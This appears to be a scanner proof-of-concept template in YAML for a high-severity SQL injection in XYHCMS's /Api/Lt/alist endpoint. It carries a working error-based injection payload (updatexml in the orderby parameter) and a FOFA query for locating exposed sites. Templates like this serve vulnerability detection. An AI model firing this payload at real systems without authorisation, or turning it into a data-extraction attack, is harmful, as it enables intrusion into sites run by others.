id: poc-yaml-xyhcms-api-alist-sqli
info:
  name: 行云海CMS /Api/Lt/alist SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 行云海CMS
  fofa: app="XYHCMS"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20md5({{.t1}})),0x3a),1);]=1
  expression: 'contains(body,"XPATH syntax error") &&

    contains(body,substr(t2,0,31))

    '
transport: http
